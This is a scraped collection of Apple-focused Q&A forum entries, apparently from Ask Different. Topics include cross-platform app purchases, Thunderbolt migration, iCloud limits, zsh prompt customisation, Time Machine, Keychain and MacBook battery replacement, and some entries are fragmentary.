purchased from the Google Play store, you'll need to purchase again on the Apple App Store.  There's no sharing there - they're just totally different.\nHowever, apps where you pay the app maker directly, and not the App Store, will have some other account - one directly with the app developer.  For example, Disney Plus, or Netflix, or Amazon Prime; all of those, you may have a separate account with the app developer.  In those cases, the separate account is with whatever email you want it to be with - it doesn't have to be the same as that of the App Store email.  You would have to log in with that service again with whatever that email is - but it would work fine.\nPlease note that, at the present, not very many apps work this way; for the most part, on iOS, you buy from Apple only.  The primary exception is \"reader\" apps, where you buy media somewhere else and then stream or download it; hence my mention of video apps earlier.  There are a few other apps that do work this way, but they're very rare.  This may change soon, due to various lawsuits and laws, but hasn't yet.\nFor clarity: Netflix, Amazon Prime, and Spotify all work like reader/streaming apps. You have a subscription with them, and you can use it on both iPhone and android.\n\nA: You are unlikely to have a problem with different email ids across different devices. I have owned both Apple and Android devices for several years, I have never come across a situation where an app/subscription was shared across both platforms. In fact I have had to buy new apps when I changed phones within the same platform (Android to newer Android) because the creators of the app could not/were not interested in catering for people upgrading phones. Effectively with an Apple phone and a separate Android phone you have two identities-one for each platform.\nFor the Android devices I've owned I've always gone with a new email address each time and just appended the device name so I know which device an email is related to e.g. joebloggsnote4@domain.com, joebloggsnote8@domain.com, ...\n\nA: If you changed your Apple Id, you can no longer access apps / subscriptions purchased with your old Apple Id. So if you have bought any apps, music or video from the App Store or Itunes Store, you will no longer have access to it. In such a case, it is best to contact Apple support and ask them to reset your password.\nAs for sharing some paid service on both Apple and Android, usually you won't have any issues. Unless they send you some important information though, to your old email id - like some verification link when you sign-in to a new device. So it is best to contact customer support of the company offering the service / subscription and request them to update and change your email id to something you still have access to.\n", "Q: How to activate IP over Thunderbolt from command line (within Recovery system) This is my setup: Two Macs (M1 2020, Mini 2018), connected with a Thunderbolt 3 cable. When both are running Big Sur, they have a working IP connection.\nHowever, if I boot the M1 Mac into Recover Mode, it connects to the network only via Wi-Fi, but not over the TB3 connection.\nWhen I enter Terminal on the M1, ifconfig lists many interfaces, but I can't tell if the TB interface is amoung them. Clearly, it shows no IPv4 address for any but the Wi-Fi interface, though.\nWhat commands do I have to enter to enable the IP-over-TB interface and get it up so that I can connect the Macs via this faster connection?\n\nA: My setup: two M1 MacBook Pro 16“ with Monterey 12.2.1\nProblem: if you use the standard Migration Assistant workflow, it takes a couple of hours because they use Peer-to-Peer Wifi network with 20MBit - even though there is one Thunderbolt4 cable connection between the machines. Whatever I did, it always used this super slow connection. Searched the internet for a proper solution but did not find anything.\nBut okey, I got this solved - at least it worked for me (photo evidence)! I have two M1 16'' MBP and need to migrate from the 500GB SSD (MPB1) to 1TB SSD (MPB2) version. Purchased a Thunderbolt4 cable today at the Apple Store.\nWhat I did after a couple of fails and searches on the net:\n\n*\n\n*MBP2: startup  MBP2 and setup one admin user, skip all iCloud and whatever setup steps\n\n*plugin Thunderbolt4 cable to both MBP1 and MBP2\n\n*MBP2: go to network settings and add a fixed IP address to the Thunderbolt Bridge, for example 10.0.5.1 and network mask 255.255.255.0 (no router)\n\n*MBP2: Activate Internet Sharing on MPB2 and share the Thunderbolt Bridge for Clients on Wifi\n-> the MPB2 will now open up a WiFi network, good idea to check the wifi settings and change the password to your own needs\n\n*MBP1: startup the standard user and set the IP Address of the Thunderbolt Bridge to 10.0.5.2/255.255.255.0\n\n*MBP1: connect to the MBP2 shared wifi network too (normally named after the computers name eg \"MacBook Pro\")\n\n*MBP2: start the Migration Assistant and start just like you would do normally (migrate from another Mac, Volume, TimeMachine)\n\n*MBP1: start the Migration Assistant and select \"transfer to another Mac\"\n\n*Actually the macs now recognized each other and selected the fastest interface for the transfer - the Thunderbolt Bridge with 1686 MB/s!\n\n*Choose whatever you want to transfer.\n\n*I discovered the highest transfer rate was at 423 MB/s!\n\n*Unfortunately I did not stop the time, but I think it took around 30mins to transfer 460GB.\n\nI think it is a big advantage, that both macs don't use another wifi and you have the Thunderbolt Interfaces with fixed IPs. That should do the deal!\nSide fact: USB-C cables are USB cables. Correctly recognize Thunderbolt 4 Cables by the printed Lightning Logo on the plug. Everything else is \"only\" USB3 ...\nI did not try it using the USB-C cable - but I assume it works, only the network interface is named differently in steps 3 and 5.\n\n\n", "Q: My iPhoto Library.photolibrary will not copy to iCloud, shows a cloud with a slash through it iPhoto Library.photolibrary file is 311GB (yes I still use and love iPhoto).

It is almost as if it is in limbo between cloud and hard disk.\nHelp, I don't want to lose this file!\n\nA: To save a copy of your photos in iCloud, try this approach:\n\n*\n\n*Open Disk Utility and choose File > New Image > Blank Image\n\n*\n\n*Name it appropriately and size it at least 311 GB (350 or 400 GB is probably better)\n\n*Choose APFS format\n\n*Choose \"read/write disk image\" format\n\n*Save it to a non-iCloud location\n\n\n\n*In Finder, open the dmg file you've just created and copy your iPhoto Library into it\n\n*\"Eject\" the Disk Image then move it into iCloud.\n\n\nA: Prequel:\nIf your drive is failing, immediately grab some type of local storage (SD card, thumb drive, external HDD/SSD) and back up the files that matter to you. If they really, really matter to you (and you are willing to spend money) turn off the machine and go to a professional ASAP.\n\niCloud Drive has a 50GB file size limit (see: https://support.apple.com/en-in/HT201104 and Which file types are \"ineligible\" for iCloud drive?)\nA workaround would be to split the file into multiple parts (using dmgparts for example: What are \"dmgpart\" files and what tools can create, merge, or manage them?).\n", "Q: How to create slow frame rate video from image sequence? I made a set of timelapse .jpg images using a Canon Rebel camera & Magic Lantern. I want to turn it into an .mp4 video.\nI understand that Quicktime v10.5 can do this, but the slowest frame rate is about 24 frames per second. I want frame rates of only 6 or even 2 frames per second. I used to use Quicktime v7 but it will not run on Catalina anymore.\nWhat Catalina software will create a 2 frames/sec video from an image sequence?\n\nA: Another unsatisfying (and potentially disk-intensive), but quick solution is to go to the directory, select all the images you want to use, then right-click and duplicate 3 times (for 6 frames/sec) or 11 times (for 2 frames/sec) -- that is, make 4 or 12 copies of each image. The \"duplicate\" command will give them names that should keep everything in order in QuickTime without having to rename anything. Then the 24 fps setting should give an equivalent of 6 or 2 fps.\n\nA: A rather unsatisfying, but workable, solution, suggested on another forum is to use iMovie. The work around is to create a movie with the jpegs, essentially setting them as a sequence of stills. Then go to iMovie preferences,\n\n*\n\n*Set \"Photo placement\" to Fit (the default is Ken Burns)\n\n*change the \"Photo duration\" of stills to a fraction of a second, say .2/frames per second\n\n*AND reduce the \"Transition\" to 0.0\n\nFinally File > Share > File\nto export it as an .mp4 file.\nAll this because some Apple software engineer didn't want to bother allowing the frame rate on a Quicktime v10 export to be settable to any number. And we cannot have discussions like this on the Apple Support site because it is bad marketing.\nWhich is Why software versions peak and then degrade over time!!\ni am hoping there is an open source or useful video editing app that is comparable to the old Quicktime 7 editing capacity.

I don't want to use keychain access or any password managers for that matter. This is my first mac and I am completely stumped at this supposedly simple task.\nMy keychain access is not linked to iCloud as in the iCloud setting it's unticked. If I delete everything inside it, the moment I log into anything it starts storing them.\nPlease just tell me how to stop using keychain access. How can I disable or unistall it permanently.\nEdit : I don't want keychain or any program to manage my passords, keychain is automatically storing all my credential without asking for any permission. How can I stop using it completely?\nEdit : No I can't just ignore it as it is storing passwords without asking for permissions and blocking me out from using multiple account on same service. This is outright shady, unethical and infuriating and there seems to be no solution.\n\nA: You can let it do its thing and just ignore it.\nYou don't have to accept to save passwords there. But whether you choose to interact with it directly , or not, leave it alone.\n\nA: You cannot uninstall it, it's part of the system and lots of services and apps rely on it. It not only stores passwords, but also certificates, keys and other information that needs to be stored securely. The Keychain Access.app is merely a UI to access the keychain service; apps and services use dedicated APIs and for the shell, there's the security command. So even if you could remove Keychain Access (the app), the service wouldn't be affected. If you were to remove the service, lots of apps and system functionality would break.\nJust don't agree to store your password whenever you are asked.\n", "Q: How to recover a deleted file which is open in QuickTime? I am using Mac 10.13.6, my QuickTime is Version 10.4 (928.13).\nI opened a .mov file in QuickTime, and then accidentally deleted it for good (using the Terminal). Fortunately, the opened window in QuickTime for that file is still available. I can play the file with sound, from start to finish.\nI am wondering if it's possible to recover the file from QuickTime?\nBut when I try to save the window, duplicate it, export it etc., I'm always getting the following error:\nThe document can’t be saved because there is no such file.\n\nIf the file can still be played, it must still be available on the file-system somewhere.\nThe problem is, when I follow other Ask Different posts, and other blog posts and try to find my file from the following paths:\n\n*\n\n*~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave Information/\n\n\n*$TMPDIR = /var/folders/05/rn0kgvkj6zbcgrnh4cyx8gyh0000gn/T/\n\n\n*~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Saved Application State\nI still cannot find my file. The folders are empty or my file is just not there.\nIs there another temp file path I am missing out?\n\nA: I don't know in what location Quicktime has stored the file. However, a possible workaround to obtain a copy of the video is to start a screen recording and record it while it plays.\nTo be safe I would not use Quicktime to record the screen. I am not sure if it will keep the video you're trying to recover open.     Instead download some other screen recording software (e.g. OBS Studiono affiliation) and use that to record the screen while the video plays.\n", "Q: Automatically change sound output/input to bluetooth speaker/headphones I have a bluetooth speaker and a couple of bluetooth headphones. I would like macOS to automatically use them for sound output/input when they connect. At the moment I have to go into Sound settings and manually select which speaker I want to use.\nHow can I make macOS automatically output and input sound on the most recently connected bluetooth speaker/headphones?\n\nA: You could use something like SoundControl to do this. It’s not free, but significantly expands your volume control in MacOS. They offer a trial, so I wouldn’t let the “non-free-ness” dissuade you.\nYou could then use the MIDI controls in MacOS to create the appropriate aggregate/multi-output devices you need.\n", "Q: Send email from alias by default, Mail app In the Mail app, I would like to automatically send new emails from my alias.\nI have the alias set up so that it appears as one of the options in the \"From\" menu when composing an email, but the \"Send new messages from\" menu in Preferences > Composing only lists my three accounts, without the alias option.\nIs there a way to automatically send emails from my alias, without having to choose it each time I compose a new email?\nIn the Gmail webapp, this can be done, but I'd like to do it from the Mail app.\n\nA: Two solutions.\n1st: Half-arsed.\nLet's say, you have 2 different email accounts and 1 of them has aliases that you'd like to use, assuming you've already added them in \"Mail Preferences - Accounts - Email addresses\" and marked/selected as \"Main\" alias.\nThen choose in \"Composing - Send new messages from - Automatically select best account\", and when you'll compose New email if you're in the folder/account of aliased email (you clicked on that account in the left panel) it should select that \"Main\" alias email automatically.\n2nd: Proper.\nWhen you're adding new Gmail account in Settings on Mac, do NOT add it as Gmail, instead click \"Add another account - Mail\", then put there your ALIAS email and your Generated password (that's important!). It will prompt some error but will give a new window.\nIn email address put your alias email;\nUser name: your GMAIL account;\nPassword: GENERATED;\nIncoming Mail Server: imap.gmail.com;\nOutgoing: smtp.gmail.com; Click Sign In, Done.\nYou won't have fancy Gmail icon in Settings, but in Mail app your default email will now be alias email, and you will be able to select it in \"Composing - Send new messages from\".\nIf you also need to use your NON alias email, add it in \"Mail Preferences - Accounts - Email addresses\", but leave your Alias as default if you want, then when you'll compose New email you'll have an option in the dropdown menu.\nHope it helps guys! Just spent two whole days myself figuring out all of those things with aliases and forwarded emails, hell of a task.\nBest regards, Stan from Frytech, tips & subs are much appreciated :) Not sure if shameless plugs like this are allowed, I'm in a real crappy situation currently, don't even have $15 to pay for expiring domain, so any penny would help hugely.

I've noticed that on the Monday after I get a Perfect Week (Move) award, my Apple Watch (SE; watchOS 7) prompts me with a new Smart Move Goal. However, this week I was perplexed to see that my proposed Smart Move Goal was unchanged from my previous move goal. I expected the watch to propose a higher goal; why didn't it?\n\n\n\nA: I think it takes into account by how much you beat your goal: if you're goal is 620 and you just made it (for instance 623), then it will assume that you're just about making it so it won't suggest a higher number. If you made it comfortably (say 700), then it will suggest an increase.\n", "Q: Is there a method to edit the \"start time\" of a calendar event without the \"end time\" changing automatically? Running Big Sur but this has been happening for many versions of macOS.\nIs there a setting/preference somewhere to change this behavior?\nThere doesn't seem to be an option inside com.apple.iCal.plist. There used to be an ical debug menu option but that is no longer.\nWhen changing the \"start time\" of an event the \"end time\" is automatically changed to keep the event duration the same. As far as I know I never prioritized duration of events.\nI then have to reset the end time to where I set it before the computer made the decision to modify it. Which requires that I check what it was before it was automatically modified. A lot of back and forth for a simple task of changing the start time.\n\nA: In either the Day or Week view, you can drag the start or end time of the event on the screen without affecting the other.  For example, a one hour event from 9am - 10am, dragging the start to 8am makes this a two hour event now without affecting the end time.\n", "Q: How do I set a rescue email for my AppleID after I have set up 2-factor authentication? I have set up two-factor authentication on my iPhone as a security setting, however, just to be safe (in case I ever lose access to this phone/number) I'd also like to set up a rescue email.\nUnfortunately, once I set the 2FA, the option to set a rescue email has disappeared from the menu.\nMy question is, where can I find this option?\n\nA: You cannot set a rescue email when you have enabled 2-factor authentication (2FA).\nThe rescue mail is used if you forget your security questions - then you can use the rescue mail to reset them. However, when you enable 2FA, you do not have security questions anymore.\nAll in all you get the better security with 2FA (compared to not enabling 2FA), and it is a benefit that you do not have to set a rescue email anymore.\n", "Q: How to change resolution with a script from ultrawide to \"regular\" resolution?

When I tried installing it on my external Hard drive, which is a 1TB SSD, I got an error(Cannot be installed in /Volumes/SATA SSD/anaconda because the path contains spaces). Is there a way to do this?\n\nA: If the error is about the space, then if the Volume (External Hard disk) is made without spaces it gets rectified. For example, in my case it was \"SATA SSD\", once modified into \"SATA_SSD\" anaconda was installed.\n", "Q: If I restore from an old Time Machine backup, can I still access newer files from the backup drive? I want to restore my Mac from Catalina back to Mojave using a Time Machine backup from last year. I have some other, newer files created since then that I would like to keep, so will I be able to still see those on the Time Machine drive if I restore?\nI don't mind if it's through the Time Machine interface or just in Finder. The drive is encrypted but I have the password.\n\nA: I bit the bullet and restored back to Mojave.\nFor anyone who has the same question - the answer is yes, I can still see my backups on the Time Machine hard drive, however the Catalina Time Machine format is different to the Mojave one, so I can't access files from the newer backups using the Time Machine app.\nHowever the data is there and can be restored using something like rsync.\nEdit with another lesson\nSomething I didn't know but accidentally saved myself from: Photos on Catalina (Photos 5) stores your photos differently to Photos on Mojave (Photos 4).\nPhotos 4 uses a logical table structure like:\nOriginals/Year/Month/Day/Photo Name.jpeg\n\nPhotos 5 uses a uuid structure:\nOriginals/1/14cb2e19-7088-4252-8fd2-ed18b9750ba2\n\nFor some reason, Time Machine doesn't backup the Photos database. So my method of downgrading and then rsync'ing the newer backup wouldn't work for Photos since rsync would not recognise the different folder structures. Luckily I was paranoid and took a separate, manual backup to a different disk before downgrading.\nThis manual backup had everything, including the Photos database. This meant I was able to use the python package osxphotos to read the Photos 5 database and pull out any photos newer than my old backup, then import those into my restored Photos 4 library.\nosxphotos --db backup/Photos\\ Library.photoslibrary export --export-by-date --from-date 2019-07-01 restored-photos\n\ntl;dr before downgrading, take a separate, manual backup of your Photos library, or at least the ./Pictures/Photos Library.photoslibrary/database folder so that you can restore any photos newer than your Mojave backup.\n", "Q: Why is the Data Roaming option missing from iPhone settings? I am travelling internationally, and charges for Internet data are about $15 per megabyte. My provider doesn't offer a roaming package for that. I plan to add a second local SIM using eSIM. I want to be sure Data Roaming is off, even if Cellular Data is on.\nCurrently using an unlocked iPhone SE 2, with iOS 14.7.1.\nAccording to this Apple help page: https://support.apple.com/en-us/HT201643 in order to turn off Data Roaming, I should: \"Open Settings and tap Cellular, or Cellular Data, or Mobile Data. Turn off Cellular Data, then tap Cellular Data Options and turn off Data Roaming.\"\nI did the above, as far as turning off Cellular Data. However, when I tap Cellular Data Options, there is no option for Data Roaming. There is only Low Data Mode. Why is it missing, and how can I assure that Data Roaming is off?\nI understand that turning off Cellular Data should stop any data roaming charges. However, I don't want to make an expensive mistake, in case I accidentally turn on Cellular Data. I want to be sure that Data Roaming is off, even if Cellular Data is on. I don't want to experiment with turning on Cellular Data to see whether an option for Data Roaming appears.\n\nA: I tested this further after arriving home. The instructions on the linked Apple Support page are incorrect, since it is not possible to \"Turn off Cellular Data, then tap Cellular Data Options and turn off Data Roaming\". As soon as you turn off Cellular Data, the option to turn Data Roaming on or off disappears from the Cellular Data Options page.\nThe best solution I can find is to turn on Airplane mode first. Then you can tap Cellular Data. It won't actually turn on (if you tap it again, it will look like it turned on, but it still doesn't). But then the option for Data Roaming appears in the Cellular Data Options page, and you can turn it off. Then, after turning Airplane Mode off, you should be able to safely turn Cellular Data on, so that you can use a second local (e-)SIM.\n", "Q: How do I make the Terminal easier to read and mentally process? I am beginning to learn to use the shell via macOS's Terminal running Zsh, and I'm finding it difficult to process all of the very tightly packed information in the commands and results.\nWhat are the most common ways to maximize intelligibility in the shell/Terminal?\nTwo specific customizations I know I'd like to try:\n\n*\n\n*How would I set up the shell to always include an extra line or a horizontal rule after each command has finished, to visually separate each command from the previous?\n\n*\n\n*From this answer, I ran PS0=\"\\n\", which did nothing.\n\n*From this answer, which took me here, I ran vi .bash_profile from the home directory, which caused my Terminal to freak out with a bunch of lines of just ~ over and over again, so I aborted that.\n\n\n\n*Is there a way to customize the way paths are displayed? e.g. Instead of path/name/example, perhaps path > name > example? For very long paths with spaces in directory names, this would increase legibility to include space between each level.\n\nA: Note that zsh is different from bash. Their scripting languages are similar (but they do have a few important differences), but the way most interaction features are configured (initialization files, prompt, command history, key bindings, etc.) is very different. Generally speaking, if you're using zsh, ignore configuration advice about bash (and vice versa).\nThe main configuration file for zsh is .zshrc in your home  directory. Zsh reads it when it starts (only when it's running interactively in a terminal, not when it's running a script). This is the place to configure prompts, completion, aliases, key bindings, etc.\n\nI ran vi .bash_profile\n\nvi is a text editor which is absolutely not newbie-friendly. Whenever you see instructions to use vi, take it as “edit this text file”, and feel free to use any text editor you like.\n\n\nHow would I set up the shell to always include an extra line or a horizontal rule after each command has finished, to visually separate each command from the previous?\n\nThe text that the shell displays before the command that you type is called the prompt. The basic way to configure the prompt is through the variable PS1. The content can be very complex, taking advantage of prompt escape sequences and more. There are whole frameworks that make it easier to customize the prompt, including a built-in prompt theme facility as well as many third-party frameworks.\nFor something simple like displaying a blank line before each prompt, it's easy to do manually. Put this line in your .zshrc:\nPS1=$'\\n'$PS1\n\nWhat this means:\n\n*\n\n*PS1=… is an assignment. It changes the value of the variable PS1 to what's on the right of the equal sign.\n\n*$'…' is one of several forms of quoting. Inside $'…', the backslash character allows you to specify non-printing characters, like with echo. \\n stands for a newline character.\n\n*$PS1 takes the current value of the variable PS1.\n\nNote that this adds a blank line each time you run the command, so if you run it twice, you'll get two blank lines.\n\nIs there a way to customize the way paths are displayed?\n\nIf you mean changing the way the current directory is typeset in the prompt, then yes, because you can run arbitrary code to choose what goes into the prompt. I wouldn't recommend it, however, because you can't customize the way paths are presented in other places, and you can't type paths in another way. Note also that anything you do there is likely to interfere with other prompt customizations.\nI'm going to assume that you've customized your prompt manually, by setting PS1, and that you use the %~ prompt escape sequence to have the current directory in the prompt with ~ standing for your home directory.\nEnable the prompt_subst option. This lets you use variables inside the prompt specification. For example, the following snippet in .zshrc causes the prompt to display the current directory and % (or # for the root user), similar to PS1='%~ %# ':\nsetopt prompt_subst\nPS1='${(D)PWD//\\%/%%} %# '\n\n\n*\n\n*We assign to the prompt with PS1='…'. Everything inside single quotes is interpreted literally: no expansion takes place, so the value of PS1 is the 13-character string ${PWD//\\%/%%}. We do this so that ${PWD//\\%/%%} is evaluated each time the prompt is displayed (in contrast, PS1=${PWD//\\%/%%} would set PS1 once and for all based on the current directory at the time of the assignment).\n\n*The PWD variable contains the full path to the current directory. Zsh updates it automatically whenever the current directory changes. $PWD or ${PWD} is the value of the PWD variable.\n\n*${(D)PWD} applies the parameter expansion flag D to the value of PWD. The effect of this flag is that if the path starts with your home directory, it's replaced by ~. This is similar to what %~ does.\n\n*${VARIABLE//…/…} is a form of parameter expansion that replaces one string by another in the value. Specifically, we use ${(D)PWD//\\%/%%} which replaces every % by %%. The backslash before the left-hand % is necessary because a bare % in this position would have a special meaning. We do this because with prompt_subst enabled, the values of variables used in the prompt are themselves subject to prompt expansion, i.e. if they contain a % character, it starts a prompt escape sequence. So PS1='$PWD' would do strange things if the path to the current directory happens to contain %.\n\nNow we can build on this to change how the path is displayed. The following snippet uses the %B and %b prompt expansion flags to cause slashes in the path to appear in bold. We use another ${…//…/…} replacement, this time to replace / by %B/%b (start bold, /, stop bold).\nsetopt prompt_subst\nPS1='${${(D)PWD//\\%/%%}//\\//%B/%b} %# '\n\n\nA: First off, prefer nano or your favourite GUI text editor instead of vi. nano ~/.zprofile or open ~/.zprofile -a TextEdit.

some problem with code or M1 SOC issue?\nHow do I explain this to apple to get a replacement? I bought this laptop on August 4th without apple care\nUpdate: @DarkDust suggested killing redis and trying, still crashing.\n\nA: I just tried on an M1 Mini, it already crashes with three processes, without printing any letter at all.\n./cpu A & ./cpu B & ./cpu C &\n\nBest to report it to Apple then.\n", "Q: If I buy a new iPhone, will I lose the location sharing with my friends? I have shared my location with different people and I am planning to get a new iPhone. Am I going to lose the location sharing with them or will iCloud fix this issue so that I can still see the location of my friends and they will see mine?\n\nA: If you are signed into iCloud on the old and new devices, your location sharing (\"Find My\") settings will carry over. iCloud is required to share location anyways - so you just need to sign into the same account.\nYou can verify this is connected to your iCloud account by signing into iCloud.com and confirming that everybody shows up on the web as well.\n", "Q: How can I manually delete files and folders from a Time Machine backup volume? We have 20 or so backups on a 3TB drive. We need to go into each backup and delete some specific folders from each.\nAttempting to do so via Finder brings up \"backup items cannot be modified\". We tried to modify the permissions which took a long time but this didn't help.\nmacOS Catalina 10.15.7\n\nA: Golden rule: Never try to delete Time Machine from Finder.\nIf you're lucky it won't let you. If you're unlucky it will - & that's no end of trouble.\nTo delete the entire history of a file or folder, first select it in Finder then from the Time Machine menu bar item, select Enter Time Machine\nYou can then right click your unwanted item & select \"Delete all Backups of…\"\n\nIf the history goes back a long way, this may take quite some time. Be patient.\n", "Q: Can I have Siri turn off Silent Mode? I have a fantastic iPhone case from Otterbox for my iPhone SE. After 1 1/2 years the little switch on the outside of the case, which activates/deactivates the hardware Silent Mode, broke.\nI can't get to the switch without opening the case. Not practical.\nCan I ask Siri to turn off Silent Mode? If I ask Siri \"silent mode off\" or \"turn off silent mode\" I get \"this is as quiet as it gets\" or \"I can't make this any quieter\". LOL, Siri.\nIs there an GUI option to turn off Silent Mode?\nSee\nHow to put your iPhone on vibrate, ring, or silent mode\nEDIT: Of course I can \"ask\" Siri, but the real question is will Siri.\n\nA: Perhaps check Do Not Disturb mode. There are multiple ways to toggle it on and off. Including using Siri. Alternatively you can enable/disable silent mode by going to settings > accessibility > touch > back tap > double-tap or triple-tap > mute. This allows you to tap on the back of your phone to toggle silent mode.\n", "Q: MacBook Air shutting down randomly My MacBook Air 2020 keeps shutting down randomly with shutdown cause 8/3 and -11 with the sometimes wrong date on the log (1970).\nThought that could be due to the high temperature on the processor so I put a thermal pad on the CPU and GPU and installed the Turbo Boost app with no success.\n\nA: Shutdown codes 3 and -11 indicate that the power button was held down for an extended period of time and caused a forced shutdown. If you aren't manually holding down the button, one possibility is that there is a short circuit across it. Did the system perhaps experience a liquid spill or mechanical damage recently?\n", "Q: What can I do to let someone test my iPhone 12 Pro Max without going through my stuff I'm looking to sell my iPhone 12 Pro max, I found a dude who's interested, so you know how it goes sometimes they test it and back out of the deal, so I don't want to erase everything beforehand.\nHow can allow them to test the phone without them going through my stuff ?

They should be willing to accept demonstrations of features like:\n\n*\n\n*The camera (video and photos)\n\n*The microphone and speaker (make a phone call, play a movie)\n\n*The screen is defect free\n\n*The buttons and ports function properly\n\nFor all of these, you can retain control of the device. There is no reason to expect they would gain any value from having full control of the device.\nIf they do want to handle the device, you will have to accept risk if you don't wipe it. There's no way to allow them full access to the device without also allowing them full access to the device.\nIf they are looking to understand that shape or size iPhone, but don't need to interact with it beyond that, you could look up Guided Access.

Because of this long lifespan, you must take particular care to avoid any possible performance issues. Ideally, Finder Sync extensions should spend most of their time running but idle. Limit the number of resources the extension consumes. Most important, be sure to avoid leaking any resources. Over time, even a small trickle can grow into a serious problem.\nThe system may also launch additional copies of your extension whenever an Open or Save dialog is displayed. This means that the user may have multiple copies of your extension running at once, and some may be very short lived. Therefore, it’s generally best if the extension focuses on handling the badges, contextual menus, and toolbar buttons. Place in a separate service (a Login Item or Launch Agent) any code that performs the sync, updates state, or communicates with remote data sources. This approach ensures that there is only one syncing service running at a time.\nhttps://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/Finder.html\n\nMultiple copies of the extension running do not, by themselves, indicate any problem with the app's code. This is how Finder Sync Extensions are designed to work. The app itself has no control over how many of its extension processes are launched.\nHowever, each extension process should take extreme care to use minimal resources when running, for the very reason that multiple copies of each extension may be launched at any given time. If a particular Finder Sync Extension's multiple active processes are consuming lots of Memory or CPU % in Activity Monitor, that may indicate a performance issue within the app.\nMultiple extension processes in Activity Monitor are a feature, not a bug.\n", "Q: How can I stop Microsoft Word (for Mac) from printing double sided by default?

Only then does my iPhone show up as an available connection on Mac.\nThis is obviously not how it’s supposed to be, so I must be doing something wrong. What I want is to have the connection between my iPhone and MacBook persist (stay connected), even if I close the lid for 5 minutes.\n\nA: So closing the lid can be going into hibernation or just sleep where some things can continue.\nIf closing the lid on your macbook is set to hibernate then you should change that.\n\nA: This might be fixed by enabling Power Nap.

I hence downloaded the Mountain Lion dmg and trying to build a USB installer stick.\nWhat I previously did was to install rEFInd and Ubuntu 20.04 where I entirely formatted the whole disk to xfs (or so, don't remember). I installed the 3rd party wifi driver that worked but the NVidia driver failed. After a reboot, linux does not complete the boot. I see a Ubuntu spinwheel screen but then it does not load unity. Switching into text only terminal with ATL + F2 fails too so no way to communicate to the system, needs. a re-install. But how?\nMy guess is a OSX USB installer. I have no OSX DVD here (Those minis have a disk drive, yes).\nLong story short, how can I create a bootable USB stick out of the downloaded Mountain Lion DMG? I tried with dmg2iso but etcher tells me that there is no bootable partition on the iso.\nADD ON:\nI have a working Big Sur MBP sitting here where I am writing from. I can create a bootable USB there with Etcher or in a Debian VM I have here...\n\nA: Your question do not entirely explain how you originally installed Ubuntu. The latest versions of Ubuntu can be installed on Macs to be EFI booted using the Mac Startup Manager. However, rEFInd and also be used to EFI or BIOS boot Ubuntu.\nYour question does not address why you can not use the Ubuntu USB installer prepared using the instructions posted here or here.\nBased on the information posted in your question, I am not entirely sure you can install Snow Leopard 10.6. The procedure for acquiring and creating a USB bootable Snow Leopard installer is given here. You may also try burning the ISO to a DVD.\nYou could also try installing El Capitan from USB. Apple's instructions for downloading and creating the USB installer are given here. Many alternate methods are given here.\nResponse to OP's ADD ON\nYou should be able to use the current version of Etcher on your MBP running Big Sur to create a USB EFI bootable Ubuntu 20.04 Installer. You can use this USB installer to try to install an EFI booting Ubuntu on your 2009 Mac mini. I say try because I do not believe the method used to install the previous Ubuntu has been established. Occasionally, a Mac can be found that can not EFI boot certain versions of Linux. You can also try installing Ubuntu to BIOS boot on your 2009 Mac mini, however the installation procedure is complicated by the inability of the firmware on your Mac mini to BIOS boot from USB.\n\nA: I have a Macbook pro 2009 booting both Ubuntu 21.04 (and before 20.10, 20.04 LTS) and Mac OS X El Capitan.  I had tried rEFInd initially but finally abandoned it. rEFInd is at best useless.\nOn this machine, USB booting would be very slow, you should use Firewire instead.\nYour Mac can boot from the original DVD sold with it and possibly with the recovery partition that should be present unless you erased it.\nYour Ubuntu does not boot but this does not prove that Mac OS does not boot.  Try by pressing alt at boot then select the Mac OS X or recovery partition.\nCommand V gives verbose mode for Mac OS X.\nResetting the PRAM (NVRAM) may help.\nYou will find useful information on AskUbuntu, including my own.\nIf you have valuable data, you should not do such things unless you have two backups, done with Carbon Copy Cloner for example.\nYou will also narrow your question after some tests.\n", "Q: Read Message Don't Show in the All Inboxes selections On MacOS Big Sur, messages only show in the all inboxes selection when they are unread.

It is not clear whether either backup type backs up visual voicemails and restores them as voicemails via restoring the backup onto a new device.\nThanks!\n\nA: The voicemails themselves are stored on ATT servers. Getting a new iPhone shouldnt impact your VM. Follow the directions on activating your new phone and you should be fine. As far as I know there isn’t a way to backup those VMs.\n\nA: I would not trust the carrier to keep all voicemails once they know it’s downloaded to your device.\nGet a tool to archive them if you can’t lose them is my advice.\n\n*\n\n*http://www.ecamm.com/mac/phoneview/\nDoing the setup of the devices wired to each other is your best bet if you have not tested a full backup of your phone to a computer. Apple says they back up ALL DATA when you backup to macOS, but I can’t say for sure if all voicemail are in that category.

I have a 2017 MacBook Pro without Touch Bar with 1090 battery cycles, 70% battery capacity and as condition it says \"Replace Soon\". I bought the computer 2 and a half years ago so my warranty is no longer valid.\nI contacted the only two apple service repair shops near me and if the battery is faulty they will charge me the equivalent of 250USD, but if they find no fault they will charge me 450USD. That's outrageous, it's almost twice the price if they find no fault in the battery because they will also charge me for the keyboard (they said the keyboard is on Apple if the battery is found to be faulty).\nI can bring it in for a diagnostic for 40 bucks (that go towards the replacement if I go for it) but I can't afford keyboard+battery, I can only afford to be charged for the battery (250 USD). I asked what is the test they do to know if the battery is failing, if it's the condition in the system report or if its something else. They told me it's something that can only be done at an Apples Diagnostic center.\nIf I take my computer they will have it for 2-5 business days and I can't spare that time if the battery won't be replaced. My computer is my work and I can only afford to be away from it to replace the battery for the 250USD. So, before I take it to be repaired, I need to know 100% that when they test it they will \"find a fault with the battery\".\nSo, what do they do to test that? It's obvious the store is not gonna tell me, but maybe I can find the info online.  Would it be bad for my computer if I wait for the condition in the battery to be \"Service Battery\"? I am assuming if that message pops up is because it is for sure failing so if I can't find a way to test the battery I might as well wait for that message if it warrantees that they will find a fault.\nMy computer shuts down randomly, it happened more often about a month ago. Sometimes the battery switches from 34% to 4% and then back to 34% once plugged into the wall.  It doesn't last more than 2-3 hours when it's on battery.\nEdit: I am on macOS Mojave\n\nA: At over 1000 cycles and 80% capacity, your battery is not 'faulty' (in the sense of performing below expectations): it has just reached the end of its life. As such, it should qualify for the cheaper replacement price.\nhttps://support.apple.com/en-gb/HT201585\nWhen I had the battery replaced in my 2015 15\" MBP, I was told by the Apple Store staff that if the battery was below 80% capacity, or failing other test criteria, then I would get the replacement at the cheaper price.\nIf it didn't fail any of criteria, then I would have to pay the higher rate. (Or I could walk away 